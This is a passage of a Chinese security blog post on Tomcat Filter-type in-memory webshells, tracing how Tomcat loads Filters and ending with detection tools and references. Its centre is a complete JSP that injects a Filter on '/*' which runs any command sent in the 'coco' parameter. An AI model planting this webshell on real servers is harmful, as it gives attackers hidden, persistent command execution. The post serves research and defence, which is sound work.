punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Hello POST~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后在<code>web.xml</code>里面新增Filter的配置项：</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span>TestFilter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-class</span><span class="token punctuation">></span></span>basic.TestFilter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-class</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-mapping</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span>TestFilter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/TestServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-mapping</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在web.xml这个文件里面，<code>&lt;filter&gt;&lt;/filter&gt;</code>标签其实对应的就是<code>org.apache.tomcat.util.descriptor.web.FilterDef</code>，<code>&lt;filter-mapping&gt;&lt;/filter-mapping&gt;</code>标签对应的是<code>org.apache.tomcat.util.descriptor.web.FilterMap</code></p><p>在<code>StandardContext</code>类中的startInternal方法里可以看到这样的加载顺序:<br><img src="/2022/04/14/memory-shell-1/tomcat-1.png"><br>先启动listener，再者是Filter，最后是Servlet。详细分析filterStart中是如何加载Filter链的，相关代码如下图所示:<br><img src="/2022/04/14/memory-shell-1/tomcat-2.png"><br>首先通过遍历从filterDefs中获取key和value，将value封装为<code>ApplicationFilterConfig</code>对象放入<code>filterConfigs</code>变量中。<br>然后在<code>StandardContext</code>的add方法下断点：<br><img src="/2022/04/14/memory-shell-1/tomcat-3.png"></p><p>Tomcat会先在<code>ContextConfig.java</code>里面从<code>web.xml</code>读取已定义的Filter，然后加入到<code>StandardContext</code>的实例化<code>context</code>里面：<br><img src="/2022/04/14/memory-shell-1/tomcat-4.png"><br>上面的两个方法都在<code>StandardContext</code>里面：<br><img src="/2022/04/14/memory-shell-1/tomcat-5.png"></p><p>接着是<code>org.apache.catalina.core.StandardContext#filterStart</code>根据已有的<code>filterDefs</code>，遍历之后存储到<code>filterConfigs</code>里面：<br><img src="/2022/04/14/memory-shell-1/tomcat-6.png"></p><p>经过上面几个步骤的处理，tomcat启动初始化完成，把web.xml里面的Filter包装好之后放在了<code>StandardContext</code>。<br>总结来说是这几个步骤：</p><ol><li>我们在代码里面定义好Filter的处理逻辑</li><li>Tomcat根据web.xml的配置包装成FilterDef和FilterMap，分别添加到filterDefs和filterMaps，这两个对象的定义都在<code>org.apache.tomcat.util.descriptor.web</code>包里面</li><li>遍历<code>filterDefs</code>对象使用<code>ApplicationFilterConfig</code>对value进行封装，封装之后的对象放入<code>filterConfigs</code>中</li><li>这个时候在<code>StandardContext</code>里面有三种对象初始化完成： <code>FilterDefs</code>、<code>Filterconfigs</code>、<code>FilterMaps</code></li></ol><p> PS: 再这个阶段Tomcat会运行Filter里面的代码</p><h3 id="Filter的运行逻辑"><a href="#Filter的运行逻辑" class="headerlink" title="Filter的运行逻辑"></a>Filter的运行逻辑</h3><p>以上是Tomcat启动过程，回到上面讲的tomcat容器组件关系图， 在容器组件结构中最底层的是<code>org.apache.catalina.core.StandardWrapper</code>，在对应的源代码里面可以看到构造函数：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/** * Create a new StandardWrapper component with the default basic Valve. */</span><span class="token keyword">public</span> <span class="token class-name">StandardWrapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    swValve<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">StandardWrapperValve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    pipeline<span class="token punctuation">.</span><span class="token function">setBasic</span><span class="token punctuation">(</span>swValve<span class="token punctuation">)</span><span class="token punctuation">;</span>    broadcaster <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">NotificationBroadcasterSupport</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在<code>org.apache.catalina.core.StandardWrapperValve#invoke</code>里面调用了Filter相关的逻辑代码：<br><img src="/2022/04/14/memory-shell-1/tomcat-7.png"><br>此时发起一个Get请求，打断点跟进<code>org.apache.catalina.core.ApplicationFilterFactory#createFilterChain</code>:<br><img src="/2022/04/14/memory-shell-1/tomcat-8.png"><br>到最后返回了filterChains对象，接着返回执行<code>filterChain.doFilter(request.getRequest(), response.getResponse());</code>:<br><img src="/2022/04/14/memory-shell-1/tomcat-9.png"></p><p>跟进之后会进入到<code>org.apache.catalina.core.ApplicationFilterChain#internalDoFilter</code>:<br><img src="/2022/04/14/memory-shell-1/tomcat-10.png"></p><p>跟进之后进入我们自定义的Filter逻辑里面去：<br><img src="/2022/04/14/memory-shell-1/tomcat-11.png"></p><p>来自宽字节师傅的总结图：<br><img src="/2022/04/14/memory-shell-1/filter.png"></p><p>来自<a href="http://wjlshare.com/archives/1529">大木头师傅</a>的总结:</p><blockquote><ol><li>根据请求的URL从FilterMaps中找出与之URL对应的Filter名称</li><li>根据Filter名称去FilterConfigs中寻找对应名称的FilterConfig</li><li>找到对应的FilterConfig之后添加到 FilterChain中，并且返回FilterChain</li><li>filterChain中调用 internalDoFilter遍历获取 chain 中的 FilterConfig ，然后从FilterConfig中获取Filter，然后调用Filter的doFilter方法</li></ol></blockquote><p>至此Filter的处理流程分析完成，主要分两个大部分，Filter的初始化和Filter的运行逻辑，如果要在tomcat里面插入Filter类型的木马，首先需要在代码里面完成Filter初始化的流程：</p><ol><li>创建恶意Filter</li><li>使用FilterDef对Filter包装</li><li>将FilterDef加入到<code>FilterDefs</code>，遍历<code>FilterDefs</code>包装为<code>FilterConfigs</code></li><li>创建FilterMap，将Filter和urlpattern对应，存放到<code>filterMaps</code></li><li>把创建的<code>FilterDefs</code>、<code>Filterconfigs</code>、<code>FilterMaps</code>放到<code>StandardContext</code></li></ol><h2 id="创建内存马"><a href="#创建内存马" class="headerlink" title="创建内存马"></a>创建内存马</h2><p>为了获取到<code>StandardContext</code>对象，我们需要先搞清楚这个对象在整Tomcat里面的结构位置：<br><code>StandardContext</code> –&gt; <code>ApplicationContext</code> –&gt; <code>ApplicationContextFacade</code></p><p>从最上层开始在<code>org.apache.catalina.core.ApplicationContextFacade</code>可以找到<code>ApplicationContext</code>:<br><img src="/2022/04/14/memory-shell-1/context-1.png"><br>根据学到的反射原理和网上大部分Filter类型的内存马，调试如下的代码：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.lang.reflect.Field"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.catalina.core.ApplicationContext"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page contentType<span class="token operator">=</span><span class="token string">"text/html;charset=UTF-8"</span> language<span class="token operator">=</span><span class="token string">"java"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>  <span class="token class-name">String</span> filterName <span class="token operator">=</span> <span class="token string">"coco"</span><span class="token punctuation">;</span>  <span class="token comment">//获取ApplicationContextFade对象，ApplicationContextFade是ServletContext的实现，所以其实是ServletContext对象</span>  <span class="token class-name">ServletContext</span> servletContext <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getSession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getServletContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token class-name">Field</span> appctx <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>  <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    appctx <span class="token operator">=</span> servletContext<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"context"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//从ApplicationContextFade获取context，这里context是指ApplicationContext</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NoSuchFieldException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  appctx<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token class-name">ApplicationContext</span> applicationContext <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ApplicationContext</span><span class="token punctuation">)</span> appctx<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>servletContext<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//获取ApplicationContext</span>  out<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"success"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">%</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最开始的代码是<code>ServletContext servletContext = request.getSession().getServletContext();</code>，如果看了<code>org.apache.catalina.core.ApplicationContextFacade</code>就明白这里是一个<code>servletContext</code>对象的实现，所以使用<code>servletContext</code>来表示，接下来就是通过反射获取<code>ApplicationContextFacade</code>的私有变量<code>context</code>，实际上就是<code>ApplicationContext</code>，然后同样的方法去<code>ApplicationContext</code>通过反射获取<code>StandardContext</code>：<br><img src="/2022/04/14/memory-shell-1/context-2.png"></p><p>完整代码：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.lang.reflect.Field"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.catalina.core.ApplicationContext"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.catalina.core.StandardContext"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.io.IOException"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.io.InputStream"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.util.Scanner"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.tomcat.util.descriptor.web.FilterDef"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.tomcat.util.descriptor.web.FilterMap"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.catalina.core.ApplicationFilterConfig"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.lang.reflect.Constructor"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.catalina.Context"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.util.Map"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page contentType<span class="token operator">=</span><span class="token string">"text/html;charset=UTF-8"</span> language<span class="token operator">=</span><span class="token string">"java"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token keyword">try</span><span class="token punctuation">&#123;</span>  <span class="token comment">//获取ApplicationContextFade对象，ApplicationContextFade是ServletContext的实现，所以其实是ServletContext对象</span>  <span class="token class-name">ServletContext</span> servletContext <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getSession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getServletContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token class-name">Field</span> appctx <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>  <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    appctx <span class="token operator">=</span> servletContext<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"context"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//从ApplicationContextFade获取context，这里context是指ApplicationContext</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NoSuchFieldException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  appctx<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token class-name">ApplicationContext</span> applicationContext <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ApplicationContext</span><span class="token punctuation">)</span> appctx<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>servletContext<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//获取ApplicationContext</span>  <span class="token class-name">Field</span> standCtx <span class="token operator">=</span> applicationContext<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"context"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  standCtx<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token class-name">StandardContext</span> standardContext <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">StandardContext</span><span class="token punctuation">)</span> standCtx<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>applicationContext<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token class-name">Filter</span> filter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Filter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token class-name">FilterConfig</span> filterConfig<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doFilter</span><span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> servletRequest<span class="token punctuation">,</span> <span class="token class-name">ServletResponse</span> servletResponse<span class="token punctuation">,</span> <span class="token class-name">FilterChain</span> filterChain<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">HttpServletRequest</span> req <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span><span class="token punctuation">)</span> servletRequest<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"coco"</span><span class="token punctuation">)</span> <span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token class-name">InputStream</span> in <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"coco"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">Scanner</span> s <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span>in<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">useDelimiter</span><span class="token punctuation">(</span><span class="token string">"\\A"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">String</span> output <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span> s<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">;</span>          servletResponse<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>        filterChain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>servletRequest<span class="token punctuation">,</span> servletResponse<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token comment">//把创建好的filter包装为FilterDef对象</span>  <span class="token class-name">String</span> filterName <span class="token operator">=</span> <span class="token string">"coco"</span><span class="token punctuation">;</span>  <span class="token class-name">FilterDef</span> filterDef <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FilterDef</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  filterDef<span class="token punctuation">.</span><span class="token function">setFilter</span><span class="token punctuation">(</span>filter<span class="token punctuation">)</span><span class="token punctuation">;</span>  filterDef<span class="token punctuation">.</span><span class="token function">setFilterName</span><span class="token punctuation">(</span>filterName<span class="token punctuation">)</span><span class="token punctuation">;</span>  filterDef<span class="token punctuation">.</span><span class="token function">setFilterClass</span><span class="token punctuation">(</span>filter<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  standardContext<span class="token punctuation">.</span><span class="token function">addFilterDef</span><span class="token punctuation">(</span>filterDef<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//调用addFilterDef加入到filterDefs</span>  <span class="token comment">//创建FilterMap并且加入到filterMaps</span>  <span class="token class-name">FilterMap</span> filterMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FilterMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  filterMap<span class="token punctuation">.</span><span class="token function">setFilterName</span><span class="token punctuation">(</span>filterName<span class="token punctuation">)</span><span class="token punctuation">;</span>  filterMap<span class="token punctuation">.</span><span class="token function">addURLPattern</span><span class="token punctuation">(</span><span class="token string">"/*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  filterMap<span class="token punctuation">.</span><span class="token function">setDispatcher</span><span class="token punctuation">(</span><span class="token class-name">DispatcherType</span><span class="token punctuation">.</span>REQUEST<span class="token punctuation">.</span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  standardContext<span class="token punctuation">.</span><span class="token function">addFilterMapBefore</span><span class="token punctuation">(</span>filterMap<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//从standardContext获取filterConfigs对象</span>  <span class="token class-name">Field</span> <span class="token class-name">Configs</span> <span class="token operator">=</span> standardContext<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"filterConfigs"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token class-name">Configs</span><span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token class-name">Map</span> filterConfigs <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Map</span><span class="token punctuation">)</span> <span class="token class-name">Configs</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>standardContext<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//利用反射创建filterConfig</span>  <span class="token class-name">Constructor</span> constructor <span class="token operator">=</span> <span class="token class-name">ApplicationFilterConfig</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token class-name">Context</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">FilterDef</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  constructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token class-name">ApplicationFilterConfig</span> filterConfig <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ApplicationFilterConfig</span><span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>standardContext<span class="token punctuation">,</span> filterDef<span class="token punctuation">)</span><span class="token punctuation">;</span>  filterConfigs<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>filterName<span class="token punctuation">,</span>filterConfig<span class="token punctuation">)</span><span class="token punctuation">;</span>  out<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"success"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token operator">%</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="内存马的排查"><a href="#内存马的排查" class="headerlink" title="内存马的排查"></a>内存马的排查</h2><p>参考天下大木头师傅，主要有两种排查方式：</p><h4 id="采用字节码的方式"><a href="#采用字节码的方式" class="headerlink" title="采用字节码的方式"></a>采用字节码的方式</h4><ol><li><a href="https://github.com/alibaba/arthas">https://github.com/alibaba/arthas</a></li><li><a href="https://github.com/LandGrey/copagent">https://github.com/LandGrey/copagent</a></li></ol><h4 id="扫描获取已有的filter"><a href="#扫描获取已有的filter" class="headerlink" title="扫描获取已有的filter"></a>扫描获取已有的filter</h4><p><a href="https://github.com/c0ny1/java-memshell-scanner">https://github.com/c0ny1/java-memshell-scanner</a><br>通过反射获取StandardContext里面所有的filter, <a href="https://gv7.me/articles/2020/filter-servlet-type-memshell-scan-capture-and-kill/">Filter/Servlet型内存马的扫描抓捕与查杀</a>:</p><pre class="line-numbers language-none"><code class="language-none">request.getSession().getServletContext() &#123;ApplicationContextFacade&#125;  -&gt; context &#123;ApplicationContext&#125;     -&gt; context &#123;StandardContext&#125;      * filterDefs      * filterMaps      * children      * servletMappings<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://mp.weixin.qq.com/s/x4pxmeqC1DvRi9AdxZ-0Lw">Tomcat源代码调试笔记-看不见的Shell</a></li><li><a href="https://mp.weixin.qq.com/s/n1wrjep4FVtBkOxLouAYfQ">冰蝎改造之适配基于tomcat Filter的无文件webshell </a></li><li><a href="https://www.yuque.com/ppwdd/xz9rb1/ahe2no">Java内存马专题套餐A</a></li><li><a href="https://mp.weixin.qq.com/s/gYGrdDtIldzrE7NHSxTDYQ">Tomcat基于Servlet的无文件webshell的相关技术研究</a></li><li><a href="https://y4er.com/post/java-deserialization-inject-behinder-memshell-note/">Java反序列化注入冰蝎内存马相关踩坑笔记</a></li><li><a href="http://blog.nsfocus.net/webshell-interceptor/">内存马的攻防博弈之旅</a></li><li><a href="https://gv7.me/articles/2020/filter-servlet-type-memshell-scan-capture-and-kill/">Filter/Servlet型内存马的扫描抓捕与查杀</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Servlet&quot;&gt;&lt;a href=&quot;#Servlet&quot; class=&quot;headerlink&quot; title=&quot;Servlet&quot;&gt;&lt;/a&gt;Servlet&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/2022/04/14/memory-shell-1/Servlet.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;当处理请求的时候：请求 → Listener → Filter → Servlet&lt;/p&gt;
